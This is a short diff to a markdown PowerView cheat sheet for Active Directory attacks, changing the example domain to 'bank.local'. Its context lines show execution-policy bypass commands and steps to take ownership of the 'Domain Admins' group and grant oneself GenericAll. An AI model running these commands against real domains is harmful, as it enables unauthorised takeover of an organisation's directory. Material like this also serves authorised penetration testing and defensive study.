@@ -1,7 +1,7 @@
 # Power view cheat sheet
 
 ## Commands
-## Note: Domain = `bank.com`, User = `goodboy`, 
+## Note: Domain = `bank.local`, User = `goodboy`
 
 ```bash
 powershell -ep bypass
@@ -107,6 +107,7 @@ Set-ExecutionPolicy Bypass -Scope Process -Force
 ```
 ```bash
 - 1. Take ownership
+
 Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity "usermad" -Verbose
 
 - 2. Grant yourself GenericAll
